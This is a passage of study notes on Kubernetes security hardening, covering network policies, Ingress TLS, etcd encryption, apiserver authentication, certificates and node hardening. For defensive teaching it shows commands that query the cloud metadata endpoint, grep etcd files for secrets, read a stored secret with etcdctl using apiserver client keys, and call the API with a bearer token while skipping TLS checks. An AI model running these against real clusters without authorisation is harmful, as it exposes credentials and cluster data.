  name: deny-ingress-80-for-backend
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingressDeny:
  - fromEntities:
    - all
  - toPorts:
    - ports:
      - port: "80"
        protocol: TCP
</code></pre>
</li>
<li>egressDeny Example:
<pre><code>apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
metadata:
  name: "deny-egress"
spec:
  endpointSelector:
    matchLabels:
      app: random-pod
  egress:
  - toEntities:
    - all
  egressDeny:
  - toEndpoints:
    - matchLabels:
        app: server
</code></pre>
</li>
</ul>
<h3 id="examples-5"><a class="header" href="#examples-5">Examples</a></h3>
<h4 id="default-deny-all"><a class="header" href="#default-deny-all">Default Deny All</a></h4>
<pre><code>apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: default-deny-all
spec:
  endpointSelector: {}
  ingress:
  - fromEntities:
    - world
</code></pre>
<h2 id="kubernetes-ingress"><a class="header" href="#kubernetes-ingress">Kubernetes Ingress</a></h2>
<h3 id="what-is-ingress"><a class="header" href="#what-is-ingress">What is Ingress?</a></h3>
<ul>
<li><strong>Ingress</strong> is an API object that manages external access to services in a Kubernetes cluster, typically HTTP and HTTPS.</li>
<li>Provides:
<ul>
<li><strong>Load balancing</strong></li>
<li><strong>SSL termination</strong></li>
<li><strong>Name-based virtual hosting</strong></li>
</ul>
</li>
</ul>
<h3 id="why-use-ingress"><a class="header" href="#why-use-ingress">Why Use Ingress?</a></h3>
<ul>
<li>To consolidate multiple service endpoints behind a single, externally accessible URL.</li>
<li>Reduce the need for creating individual LoadBalancers or NodePort services.</li>
</ul>
<h3 id="key-components-of-ingress"><a class="header" href="#key-components-of-ingress">Key Components of Ingress</a></h3>
<ol>
<li>
<p><strong>Ingress Controller</strong></p>
<ul>
<li>Software that watches for Ingress resources and implements the rules.</li>
<li>Popular Ingress controllers:
<ul>
<li><code>ingress-nginx</code></li>
<li><code>Traefik</code></li>
<li><code>HAProxy</code></li>
<li><code>Istio Gateway</code></li>
</ul>
</li>
<li>Must be installed separately in the cluster.</li>
</ul>
</li>
<li>
<p><strong>Ingress Resource</strong></p>
<ul>
<li>The Kubernetes object that defines how requests should be routed to services.</li>
</ul>
</li>
</ol>
<h3 id="ingress-resource-configuration"><a class="header" href="#ingress-resource-configuration">Ingress Resource Configuration</a></h3>
<ul>
<li>As of Kubernetes 1.20, you can create an ingress using kubectl:
<pre><code>kubectl create ingress  --rule="host/path=service:port"
</code></pre>
</li>
</ul>
<h3 id="basic-structure"><a class="header" href="#basic-structure">Basic Structure</a></h3>
<pre><code>```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
spec:
  rules:
    - host: example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: example-service
                port:
                  number: 80
```
</code></pre>
<h3 id="ingress-with-tls"><a class="header" href="#ingress-with-tls">Ingress with TLS</a></h3>
<ul>
<li>
<p>Kubernetes automatically creates a self-signed certificate for HTTPS. To view it, first determine the HTTPS port of the ingress controller service:</p>
<pre><code>kubeadmin@kube-controlplane:~$ k get svc -n ingress-nginx
NAME                                 TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                      AGE
ingress-nginx-controller             NodePort    10.103.169.156   &lt;none&gt;        80:31818/TCP,443:30506/TCP   38m
ingress-nginx-controller-admission   ClusterIP   10.103.26.228    &lt;none&gt;        443/TCP                      38m
kubeadmin@kube-controlplane:~$
</code></pre>
</li>
<li>
<p>The HTTPS port is 30506 in this case. To view the self-signed certificate, we can use curl:</p>
<pre><code> Œª notes $ curl https://13.68.211.113:30506/service1 -k -v
* (304) (OUT), TLS handshake, Finished (20):
} [52 bytes data]
* SSL connection using TLSv1.3 / AEAD-AES256-GCM-SHA384 / [blank] / UNDEF
* ALPN: server accepted h2
* Server certificate:
*  subject: O=Acme Co; CN=Kubernetes Ingress Controller Fake Certificate             &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
*  start date: Dec 20 14:23:08 2024 GMT
*  expire date: Dec 20 14:23:08 2025 GMT
*  issuer: O=Acme Co; CN=Kubernetes Ingress Controller Fake Certificate
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://13.68.211.113:30506/service1
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: 13.68.211.113:30506]
* [HTTP/2] [1] [:path: /service1]
* [HTTP/2] [1] [user-agent: Mozilla/5.0 Gecko]
* [HTTP/2] [1] [accept: */*]
&gt; GET /service1 HTTP/2
&gt; Host: 13.68.211.113:30506
&gt; User-Agent: Mozilla/5.0 Gecko
&gt; Accept: */*
</code></pre>
</li>
<li>
<p>To configure a ingress resource to use TLS (HTTPS), we first need to create a certificate:</p>
<pre><code># create a new 2048-bit RSA private key and associated cert
openssl req -nodes -new -x509 -keyout my.key -out my.crt -subj "/CN=mysite.com"
</code></pre>
</li>
<li>
<p>Next, create a secret for the tls cert:</p>
<pre><code>kubectl create secret tls mycert --cert=my.crt --key=my.key -n my-namespace
</code></pre>
</li>
<li>
<p>Create the ingress:</p>
<pre><code>apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: secure-ingress
  annotations:
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
spec:
  tls:
    - hosts:
        - example.com
      secretName: mycert
  rules:
    - host: example.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: secure-service
                port:
                  number: 80
</code></pre>
</li>
</ul>
<h3 id="annotations"><a class="header" href="#annotations">Annotations</a></h3>
<ul>
<li>Extend the functionality of Ingress controllers.</li>
<li>Common examples (specific to nginx):
<ul>
<li>nginx.ingress.kubernetes.io/rewrite-target: Rewrite request paths.</li>
<li>nginx.ingress.kubernetes.io/ssl-redirect: Force SSL.</li>
<li>nginx.ingress.kubernetes.io/proxy-body-size: Limit request size.</li>
</ul>
</li>
</ul>
<h2 id="protecting-node-metadata-and-endpoints"><a class="header" href="#protecting-node-metadata-and-endpoints">Protecting Node Metadata and Endpoints</a></h2>
<h3 id="protecting-endpoints"><a class="header" href="#protecting-endpoints">Protecting Endpoints</a></h3>
<pre><code>- Kubernetes clusters expose information on various ports:

    | Port Range | Purpose  |
    | ---------- | -------  | 
    | 6443       | kube-api |
    | 2379 - 2380 | etcd    |
    | 10250       | kubelet api |
    | 10259       | kube-scheduler |
    | 10257       | kube-controller-manager |

- Many of these ports are configurable. For example, to change the port that kube-api listens on, just modify `--secure-port` in the kube-api manifest.
- Setup firewall rules to minimize the attack surface
</code></pre>
<h3 id="securing-node-metadata"><a class="header" href="#securing-node-metadata">Securing Node Metadata</a></h3>
<ul>
<li>
<p>A lot of information can be obtained from node metadata</p>
<ul>
<li>Node name</li>
<li>Node state</li>
<li>annotations</li>
<li>System Info</li>
<li>etc.</li>
</ul>
</li>
<li>
<p>Why secure node metadata?</p>
<ul>
<li>If node metadata is tampered with, pods may be assigned to the wrong nodes, which has security implications to considers</li>
<li>You can determine the version of kubelet and other kubernetes components from node metadata</li>
<li>If an attacker can modify node metadata, they could taint all the nodes, making all nodes unscheduleable</li>
</ul>
</li>
<li>
<p>Protection Strategies</p>
<ul>
<li>Use RBAC to control who has access to modify node metadata</li>
<li>Node isolation using labels and node selectors</li>
<li>Audit logs to determine who is accessing the cluster and respond accordingly</li>
<li>Update node operating systems regularly</li>
<li>Update cluster components regularly</li>
</ul>
</li>
<li>
<p>Cloud providers such as Amazon and Azure often expose node information via metadata endpoints on the node. These endpoints are important to protect.</p>
</li>
<li>
<p>This endpoint can be accessed at 169.254.169.254 on nodes in both Azure and AWS. An example for Azure:</p>
<pre><code>curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq
</code></pre>
</li>
<li>
<p>Node metadata endpoints can be prevented from being accessed by pods by creating network policies.</p>
<pre><code>apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress-metadata-server
  namespace: a12
spec:
  policyTypes:
  - Egress
  podSelector: {}
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
</code></pre>
</li>
</ul>
<h2 id="verify-kubernetes-binaries"><a class="header" href="#verify-kubernetes-binaries">Verify Kubernetes Binaries</a></h2>
<ul>
<li>The SHA sum of a file changes if the content within the file is changed</li>
<li>You can download the binaries from github using wget.
Example: <code>wget -O /opt/kubernetes.tar.gz https://dl.k8s.io/v1.31.1/kubernetes.tar.gz</code></li>
<li>To validate that a binary downloaded from the internet has not been modified, check the hash code:
<pre><code>echo $(cat kubectl.sha256) kubectl | sha256sum --check
</code></pre>
</li>
</ul>
<h2 id="securing-etcd"><a class="header" href="#securing-etcd">Securing etcd</a></h2>
<ul>
<li>etcd is a distributed key-value store that Kubernetes uses to store configuration data</li>
<li>etcd by default listens on port 2379/tcp</li>
</ul>
<h3 id="play-with-etcd"><a class="header" href="#play-with-etcd">Play with etcd</a></h3>
<h4 id="step-1-create-the-base-binaries-directory"><a class="header" href="#step-1-create-the-base-binaries-directory">Step 1: Create the Base Binaries Directory</a></h4>
<pre><code>```sh
    mkdir /root/binaries
    cd /root/binaries
```
</code></pre>
<h4 id="step-2-download-and-copy-the-etcd-binaries-to-path"><a class="header" href="#step-2-download-and-copy-the-etcd-binaries-to-path">Step 2: Download and Copy the ETCD Binaries to Path</a></h4>
<pre><code>```sh
    wget https://github.com/etcd-io/etcd/releases/download/v3.5.18/etcd-v3.5.18-linux-amd64.tar.gz

    tar -xzvf etcd-v3.5.18-linux-amd64.tar.gz

    cd /root/binaries/etcd-v3.5.18-linux-amd64/

    cp etcd etcdctl /usr/local/bin/
```
</code></pre>
<h4 id="step-3-start-etcd"><a class="header" href="#step-3-start-etcd">Step 3: Start etcd</a></h4>
<pre><code>```sh
    cd /tmp
    etcd
```
</code></pre>
<h4 id="step-4-verification---store-and-fetch-data-from-etcd"><a class="header" href="#step-4-verification---store-and-fetch-data-from-etcd">Step 4: Verification - Store and Fetch Data from etcd</a></h4>
<pre><code>```sh
    etcdctl put key1 "value1"
```

```sh
    etcdctl get key1
```
</code></pre>
<h3 id="encrypting-data-in-transit-in-etcd"><a class="header" href="#encrypting-data-in-transit-in-etcd">Encrypting data in transit in etcd</a></h3>
<ul>
<li>etcd supports TLS encryption for data in transit</li>
<li>By default, etcd packaged with kubeadm is configured to use TLS encryption</li>
<li>One can capture packets from etcd using tcpdump:
<pre><code>      root@controlplane00:/var/lib/etcd/member# tcpdump -i lo -X port 2379

      tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
      listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
      16:10:01.691453 IP localhost.2379 &gt; localhost.42040: Flags [P.], seq 235868994:235869033, ack 3277609642, win 640, options [nop,nop,TS val 1280288044 ecr 1280288042], length 39
              0x0000:  4500 005b 35e4 4000 4006 06b7 7f00 0001  E..[5.@.@.......
              0x0010:  7f00 0001 094b a438 0e0f 1342 c35c 5aaa  .....K.8...B.\Z.
              0x0020:  8018 0280 fe4f 0000 0101 080a 4c4f a52c  .....O......LO.,
              0x0030:  4c4f a52a 1703 0300 2289 00d8 5dcc 7b88  LO.*...."...].{.
              0x0040:  6f7a 290f 536b 0fd0 f7d9 1fb4 f83f 4aab  oz).Sk.......?J.
              0x0050:  a6e7 0af8 0835 e597 a93d 4d              .....5...=M
      16:10:01.691479 IP localhost.42040 &gt; localhost.2379: Flags [.], ack 39, win 14819, options [nop,nop,TS val 1280288044 ecr 1280288044], length 0
              0x0000:  4500 0034 7174 4000 4006 cb4d 7f00 0001  E..4qt@.@..M....
              0x0010:  7f00 0001 a438 094b c35c 5aaa 0e0f 1369  .....8.K.\Z....i
              0x0020:  8010 39e3 fe28 0000 0101 080a 4c4f a52c  ..9..(......LO.,
              0x0030:  4c4f a52c                                LO.,
      16:10:01.691611 IP localhost.2379 &gt; localhost.42040: Flags [P.], seq 39:1222, ack 1, win 640, options [nop,nop,TS val 1280288044 ecr 1280288044], length 1183
              0x0000:  4500 04d3 35e5 4000 4006 023e 7f00 0001  E...5.@.@..&gt;....
              0x0010:  7f00 0001 094b a438 0e0f 1369 c35c 5aaa  .....K.8...i.\Z.
              0x0020:  8018 0280 02c8 0000 0101 080a 4c4f a52c  ............LO.,
              0x0030:  4c4f a52c 1703 0304 9ac0 c579 d4ed 808c  LO.,.......y....

              ..... redacted
</code></pre>
</li>
<li>The traffic captured in the output above is encrypted.</li>
</ul>
<h3 id="encrypting-data-at-rest-in-etcd"><a class="header" href="#encrypting-data-at-rest-in-etcd">Encrypting data at rest in etcd</a></h3>
<ul>
<li>
<p>By default, the API server stores plain-text representations of resources into etcd, with no at-rest encryption.</p>
</li>
<li>
<p>etcd stores data in the <code>/var/lib/etcd/member</code> directory. When the database is not encrypted, one can easily grep the contents of this directory, looking for secrets:</p>
<pre><code>root@controlplane00:/var/lib/etcd/member# ls -lisa
total 16
639000 4 drwx------ 4 root root 4096 Mar 21 10:53 .
385187 4 drwx------ 3 root root 4096 Mar 21 10:52 ..
639002 4 drwx------ 2 root root 4096 Mar 21 14:43 snap
638820 4 drwx------ 2 root root 4096 Mar 21 11:59 wal

root@controlplane00:/var/lib/etcd/member# grep -R test-secret .
grep: ./wal/00000000000000ac-0000000000a9340b.wal: binary file matches
grep: ./wal/00000000000000a8-0000000000a721c1.wal: binary file matches
grep: ./wal/00000000000000aa-0000000000a83f1e.wal: binary file matches
grep: ./wal/00000000000000a9-0000000000a7b97e.wal: binary file matches
grep: ./wal/00000000000000ab-0000000000a8d8a7.wal: binary file matches
grep: ./snap/db: binary file matches
</code></pre>
</li>
<li>
<p>The kube-apiserver process accepts an argument ‚Äìencryption-provider-config that specifies a path to a configuration file. The contents of that file, if you specify one, control how Kubernetes API data is encrypted in etcd.</p>
</li>
<li>
<p>If you are running the kube-apiserver without the ‚Äìencryption-provider-config command line argument, you do not have encryption at rest enabled. If you are running the kube-apiserver with the ‚Äìencryption-provider-config command line argument, and the file that it references specifies the <code>identity</code> provider as the first encryption provider in the list, then you do not have at-rest encryption enabled (the default identity provider does not provide any confidentiality protection.)</p>
</li>
<li>
<p>If you are running the kube-apiserver with the ‚Äìencryption-provider-config command line argument, and the file that it references specifies a provider other than <code>identity</code> as the first encryption provider in the list, then you already have at-rest encryption enabled. However, that check does not tell you whether a previous migration to encrypted storage has succeeded.</p>
</li>
<li>
<p>Example EncryptionConfiguration:</p>
<pre><code>  apiVersion: apiserver.config.k8s.io/v1
  kind: EncryptionConfiguration
  resources:
    - resources:
        - secrets
        - configmaps
        - pandas.awesome.bears.example # a custom resource API
      providers:
        # This configuration does not provide data confidentiality. The first
        # configured provider is specifying the "identity" mechanism, which
        # stores resources as plain text.
        #
        - identity: {} # plain text, in other words NO encryption
        - aesgcm:
            keys:
              - name: key1
                secret: c2VjcmV0IGlzIHNlY3VyZQ==
              - name: key2
                secret: dGhpcyBpcyBwYXNzd29yZA==
        - aescbc:
            keys:
              - name: key1
                secret: c2VjcmV0IGlzIHNlY3VyZQ==
              - name: key2
                secret: dGhpcyBpcyBwYXNzd29yZA==
        - secretbox:
            keys:
              - name: key1
                secret: YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=
    - resources:
        - events
      providers:
        - identity: {} # do not encrypt Events even though *.* is specified below
    - resources:
        - '*.apps' # wildcard match requires Kubernetes 1.27 or later
      providers:
        - aescbc:
            keys:
            - name: key2
              secret: c2VjcmV0IGlzIHNlY3VyZSwgb3IgaXMgaXQ/Cg==
    - resources:
        - '*.*' # wildcard match requires Kubernetes 1.27 or later
      providers:
        - aescbc:
            keys:
            - name: key3
              secret: c2VjcmV0IGlzIHNlY3VyZSwgSSB0aGluaw==
</code></pre>
</li>
<li>
<p>Each resources array item is a separate config and contains a complete configuration. The resources.resources field is an array of Kubernetes resource names (resource or resource.group) that should be encrypted like Secrets, ConfigMaps, or other resources.</p>
</li>
<li>
<p>https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/</p>
</li>
<li>
<p>After enabling encryption in etcd, any resources that you created prior to enabling encryption will not be encrypted. For example, you can encrypt secrets by running:</p>
</li>
</ul>
<pre><code>kubectl get secrets -A -o yaml | kubectl replace -f -
</code></pre>
<ul>
<li>Example of getting a secret in etcd:</li>
</ul>
<pre><code>root@controlplane00:/etc/kubernetes/pki# ETCDCTL_API=3 etcdctl --cacert=./etcd/ca.crt --cert=./apiserver-etcd-client.crt --key=./apiserver-etcd-client.key get /registry/secrets/default/mysecret

/registry/secrets/default/mysecret
k8s:enc:aescbc:v1:key1:‹®t&gt;;8‹ë%TUIodEs*lsHGwjeF8S!Aqaj\PqÕæ9»∫7dJe{B2=|p4#'BuCxUY,*IuFM
                                                                                   wxx@
2Q0e5UzH^^)rX_H%GU…à-XqC.ÀΩpC `kBW&gt;K12 n

</code></pre>
<p>The path to the resource in the etcd database is ‚Äò/registry/<resource type="">/<namespace>/<resource name="">‚Äô</resource></namespace></resource></p>
<h2 id="securing-kube-apiserver"><a class="header" href="#securing-kube-apiserver">Securing kube-apiserver</a></h2>
<ul>
<li>Kube-apiserver acts as the gateway for all resources in kubernetes. Kube-apiserver is the only component in kubernetes that communicates with etcd</li>
<li>kube-apiserver authenticates to etcd using TLS client certificates.</li>
<li>Kube-apiserver should encrypt data before it is stored in etcd</li>
<li>kube-apiserver should only listen on an HTTPS endpoint. There was an option to host kube-apiserver on an HTTP endpoint, but this option has been deprecated as of 1.10 and removed in 1.22</li>
<li>kube-apiserver should have auditing enabled</li>
</ul>
<h3 id="authentication"><a class="header" href="#authentication">Authentication</a></h3>
<ul>
<li>One can authentication to the KubeAPI server using certificates or a kubeconfig file</li>
</ul>
<h3 id="access-controls"><a class="header" href="#access-controls">Access Controls</a></h3>
<ul>
<li>After a request is authenticated, it is authorized. Authorization is the process of determining what actions a user can perform.</li>
<li>Multiple authorization modules are supported:
<ul>
<li>AlwaysAllow - Allows all requests</li>
<li>AlwaysDeny - Blocks all requests</li>
<li>RBAC - Role-based access control for requests. This is the default authorization module in kubernetes</li>
<li>Node - Authorizes kubelets to access the kube-api server</li>
</ul>
</li>
</ul>
<h1 id="2-cluster-hardening"><a class="header" href="#2-cluster-hardening">2 Cluster Hardening</a></h1>
<h2 id="securing-access-to-the-kubeapi-server"><a class="header" href="#securing-access-to-the-kubeapi-server">Securing Access to the KubeAPI Server</a></h2>
<ul>
<li>A request to the KubeAPI server goes through 4 stages before it is processed by KubeAPI:
<ul>
<li>Authentication
<ul>
<li>Validates the identity of the caller by inspecting client certificates or tokens</li>
</ul>
</li>
<li>Authorization
<ul>
<li>The authorization stage verifies that the identity found in the first stage can access the verb and resource in the request</li>
</ul>
</li>
<li>Admission Controllers
<ul>
<li>Admission Control verifies that the requst is well-formed and/or potentially needs to be modified before proceeding</li>
</ul>
</li>
<li>Validation
<ul>
<li>This stage ensures that the request is valid.</li>
</ul>
</li>
</ul>
</li>
<li>You can determine the endpoint for the kubeapi server by running: <code>kubectl cluster-info</code></li>
<li>KubeAPI is also exposed via a service named ‚Äòkubernetes‚Äô in the default namespace
<pre><code>kubeadmin@kube-controlplane:~$ k get svc kubernetes -n default -o yaml
  apiVersion: v1
  kind: Service
  metadata:
    creationTimestamp: "2024-11-11T10:57:42Z"
    labels:
      component: apiserver
      provider: kubernetes
    name: kubernetes
    namespace: default
    resourceVersion: "234"
    uid: 768d1a22-91ff-4ab3-8cd7-b86340fc319a
  spec:
    clusterIP: 10.96.0.1
    clusterIPs:
    - 10.96.0.1
    internalTrafficPolicy: Cluster
    ipFamilies:
    - IPv4
    ipFamilyPolicy: SingleStack
    ports:
    - name: https
      port: 443
      protocol: TCP
      targetPort: 6443
    sessionAffinity: None
    type: ClusterIP
  status:
    loadBalancer: {}
</code></pre>
<ul>
<li>The endpoint of the kube-api server is also exposed to pods via environment variables:</li>
</ul>
<pre><code>kubeadmin@kube-controlplane:~$ k exec -it other -- /bin/sh -c 'env | grep -i kube'
 KUBERNETES_SERVICE_PORT=443
 KUBERNETES_PORT=tcp://10.96.0.1:443
 KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
 KUBERNETES_PORT_443_TCP_PORT=443
 KUBERNETES_PORT_443_TCP_PROTO=tcp
 KUBERNETES_SERVICE_PORT_HTTPS=443
 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
 KUBERNETES_SERVICE_HOST=10.96.0.1
    ``` 

</code></pre>
</li>
</ul>
<h2 id="authentication-1"><a class="header" href="#authentication-1">Authentication</a></h2>
<ul>
<li>There are two types of accounts that would need access to a cluster: Humans and Machines. There is no such thing as a ‚Äòuser account‚Äô primitive in Kubernetes.</li>
</ul>
<h3 id="user-accounts"><a class="header" href="#user-accounts">User accounts</a></h3>
<ul>
<li>Developers, cluster admins, etc.</li>
</ul>
<h3 id="service-accounts"><a class="header" href="#service-accounts">Service Accounts</a></h3>
<ul>
<li>Service Accounts are created and managed by the Kubernetes API and can be used for machine authentication</li>
<li>To create a service account: <code>kubectl create serviceaccount &lt;account name&gt;</code></li>
<li>Service accounts are namespaced</li>
<li>When a service account is created, it has a token created automatically. The token is stored as a secret object.</li>
<li>You can also use the base64 encoded token to communicate with the Kube API Server:
<code>curl https://172.16.0.1:6443/api -insecure --header "Authorization: Bearer &lt;token value&gt;"</code></li>
<li>You can grant service accounts permission to the cluster itself by binding it to a role with a rolebinding. If a pod needs access to the cluster where it is hosted, you you configure the automountServiceAccountToken boolean parameter on the pod and assign it a service account that has the appropriate permissions to the cluster. The token will be mounted to the pods file system, where the value can then be accessed by the pod. The secret is mounted at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</li>
<li>A service account named ‚Äòdefault‚Äô is automatically created in every namespace</li>
<li>As of kubernetes 1.22, tokens are automatically mounted to pods by an admission controller as a projected volume.
<ul>
<li>https://github.com/kubernetes/enhancements/blob/master/keps/sig-auth/1205-bound-service-account-tokens/README.md</li>
</ul>
</li>
<li>As of Kubernetes 1.24, when you create a service account, a secret is no longer created automatically for the token. Now you must run <code>kubectl create token &lt;service account name&gt;</code> to create the token.
<ul>
<li>https://github.com/kubernetes/enhancements/issues/2799</li>
</ul>
</li>
<li>One can also manually create a token for a service account:</li>
</ul>
<pre><code>kubectl create token &lt;service-account-name&gt; --duration=100h
</code></pre>
<h2 id="tls-certificates"><a class="header" href="#tls-certificates">TLS Certificates</a></h2>
<ul>
<li>Server certificates are used to communicate with clients</li>
<li>Client certificates are used to communicate with servers</li>
<li>Server components used in Kubernetes and their certificates:
<ul>
<li>kube-api server: apiserver.crt, apiserver.key</li>
<li>etcd-server: etcdserver.crt, etcdserver.key</li>
<li>kubelet: kubelet.crt, kubelet.key</li>
</ul>
</li>
<li>Client components used in kubernetes and their certificates:
<ul>
<li>user certificates</li>
<li>kube-scheduler: scheduler.crt, scheduler.key</li>
<li>kube-controller-manager: controller-manager.crt, controller-manager.key</li>
<li>kube-proxy: kubeproxy.crt, kubeproxy.key</li>
</ul>
</li>
<li>To generate a self-signed certificate:
<code>openssl req -nodes -x509 -keyout my.key -out my.crt --subj="/CN=mysite.com"</code></li>
<li>To generate certificates, you can use openssl:
<ul>
<li>Create a new private key:
<code>openssl genrsa -out my.key 2048</code></li>
<li>Create a new certificate signing request:
<code>openssl req -new -key my.key -out my.csr -subj "/CN=ryan"</code></li>
<li>Sign the csr and generate the certificate or create a signing request with kube-api:
<ul>
<li>Sign and generate:
<code>openssl x509 -req -in my.csr -out my.crt</code></li>
<li>Create a <code>CertificateSigningRequest</code> with kube-api:
<pre><code># extract the base64 encoded values of the CSR:
cat my.csr | base64 | tr -d '\n'

# create a CertificateSigningRequest object with kube-api, provide the base64 encoded value
.... see the docs
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>kubeadm will automatically generate certificates for clusters that it creates
<ul>
<li>kubeadm generates certificates in the <code>/etc/kubernetes/pki/</code> directory</li>
</ul>
</li>
<li>To view the details of a certificate, use openssl:
<code>openssl x509 -in &lt;path to crt&gt; -text -noout</code></li>
<li>Once you have a private key, you can sign it using the <a href="https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/#create-certificatessigningrequest">CertificateSigningRequest</a> object. The controller manager is responsible for signing these requests. You can then use the signed certificate values to authenticate to the Kube API server by placing the signed key, certificate, and ca in a kube config file (~/.kube/config)</li>
</ul>
<h2 id="kubelet-security"><a class="header" href="#kubelet-security">kubelet Security</a></h2>
<ul>
<li>By default, requests to the kubelet API are not authenticated. These requests are bound to an ‚Äòunauthenticated users‚Äô group. This behavior can be changed by setting the <code>--anonymous-auth</code> flag to <code>false</code> in the kubelet config</li>
<li>kubelet ports
<ul>
<li>port 10250 on the machine running a kubelet process serves an API that allows full access</li>
<li>port 10255 on the machine running a kubelet process serves an unauthenticated, read-only API</li>
</ul>
</li>
<li>kubelet supports 2 authentication mechanisms: bearer token and certificated-based authentication</li>
<li>You can find the location of the kubelet config file by looking at the process: <code>ps aux |grep -i kubelet</code></li>
</ul>
<h2 id="authorization"><a class="header" href="#authorization">Authorization</a></h2>
<h3 id="roles-and-clusterroles"><a class="header" href="#roles-and-clusterroles">Roles and ClusterRoles</a></h3>
<ul>
<li>Roles and clusteroles define what a user or service account can do within a cluster</li>
<li>The kubernetes primitive <code>role</code> is namespaced, <code>clusterrole</code> is not</li>
</ul>
<h3 id="role-bindings-and-cluster-role-bindings"><a class="header" href="#role-bindings-and-cluster-role-bindings">Role Bindings and Cluster Role Bindings</a></h3>
<ul>
<li><code>rolebinding</code> and <code>clusterrolebinding</code> link a user or service account to a role</li>
</ul>
<h1 id="3-system-hardening"><a class="header" href="#3-system-hardening">3 System Hardening</a></h1>
<h2 id="principle-of-least-privilege"><a class="header" href="#principle-of-least-privilege">Principle of Least Privilege</a></h2>
<ul>
<li>Ensure that people or bots only have access to what is needed, and nothing else.</li>
</ul>
<h2 id="limit-access-to-nodes"><a class="header" href="#limit-access-to-nodes">Limit access to nodes</a></h2>
<h3 id="managing-local-users-and-groups"><a class="header" href="#managing-local-users-and-groups">Managing Local Users and Groups</a></h3>
<ul>
<li>Commands to be aware of:
<code>id</code>
<code>who</code>
<code>last</code>
<code>groups</code>
<code>useradd</code>
<code>userdel</code>
<code>usermod</code>
<code>groupdel</code></li>
<li>Files to be aware of:
<code>/etc/passwd</code>
<code>/etc/shadow</code>
<code>/etc/group</code></li>
<li>Disable logins for users and set their login shell to <code>/bin/nologin</code></li>
<li>Remove users from groups they do not need to belong to</li>
</ul>
<h3 id="securing-ssh"><a class="header" href="#securing-ssh">Securing SSH</a></h3>
<ul>
<li>Set the following in <code>sshd_config</code></li>
</ul>
<pre><code>PermitRootLogin no
PasswordAuthentication no
</code></pre>
<h3 id="using-sudo"><a class="header" href="#using-sudo">Using sudo</a></h3>
<ul>
<li>The <code>/etc/sudoers</code> file controls and configures the behavior of the <code>sudo</code> command. Each entry follows a structured syntax. Below is a breakdown of the fields and their meanings:</li>
</ul>
<pre><code># Example Lines
# ----------------------------------
# User/Group       Host=Command(s)
admin             ALL=(ALL) NOPASSWD: ALL
%developers       ALL=(ALL) ALL
john              ALL=(ALL:ALL) /usr/bin/apt-get

# Field Breakdown

admin             ALL=(ALL) NOPASSWD: ALL
|                 |   |       |         |
|                 |   |       |         +---&gt; Command(s): Commands the user/group can execute.
|                 |   |       +------------&gt; Options: Modifiers like `NOPASSWD` (no password required).
|                 |   +--------------------&gt; Runas: User/Group the command can be run as.
|                 +------------------------&gt; Host: On which machine this rule applies (`ALL` for any).
+-----------------------------------------&gt; User/Group: The user or group this rule applies to.

# Examples Explained

1. Allow `admin` to execute any command without a password:
   admin ALL=(ALL) NOPASSWD: ALL
</code></pre>
<h3 id="remove-packages-packages"><a class="header" href="#remove-packages-packages">Remove Packages Packages</a></h3>
<ul>
<li>This one is self-explanatory. Don‚Äôt have unnecessary software installed on your nodes.</li>
</ul>
<h3 id="restrict-kernel-modules"><a class="header" href="#restrict-kernel-modules">Restrict Kernel Modules</a></h3>
<ul>
<li>Kernel modules are ways of extending the kernel to enable it to understand new hardware. They are like device drivers.</li>
<li><code>modprobe</code> allows you to load a kernel module</li>
<li><code>lsmod</code> allows you to view all loaded modules</li>
<li>You can blacklist modules by adding a new entry to <code>/etc/modprobe.d/blacklist.conf</code>
<ul>
<li>The entry should be in the format <code>blacklist &lt;module name&gt;</code></li>
<li>Example: <code>echo "blacklist sctp" &gt;&gt; /etc/modprobe.d/blacklist.conf</code></li>
</ul>
</li>
<li>You may need to reboot the system after disabling kernel modules or blacklisting them</li>
</ul>
<h3 id="disable-open-ports"><a class="header" href="#disable-open-ports">Disable Open Ports</a></h3>
<ul>
<li>Use <code>netstat -tunlp</code> or to list listening ports on a system</li>
<li>Stop the service associated with the open port or disable access with a firewall
<ul>
<li>Common firewalls you can use are <code>iptables</code> or <code>ufw</code>
<ul>
<li>Run <code>ufw status</code> to list the current status of the UFW firewall</li>
<li>Allow all traffic outbound: <code>ufw default allow outgoing</code></li>
<li>Deny all incoming: <code>ufw default deny incoming</code></li>
<li>Allow SSH from 172.16.154.24: <code>ufw allow from 172.16.154.24 to any port 22 proto tcp</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="tracing-syscalls"><a class="header" href="#tracing-syscalls">Tracing Syscalls</a></h2>
<ul>
<li>There are several ways to trace syscalls in Linux.</li>
</ul>
<h3 id="strace"><a class="header" href="#strace">strace</a></h3>
<ul>
<li><code>strace</code> is included with most Linux distributions.</li>
<li>To use <code>strace</code>, simply add it before the binary that you are running:
<pre><code>strace touch /tmp/test
</code></pre>
</li>
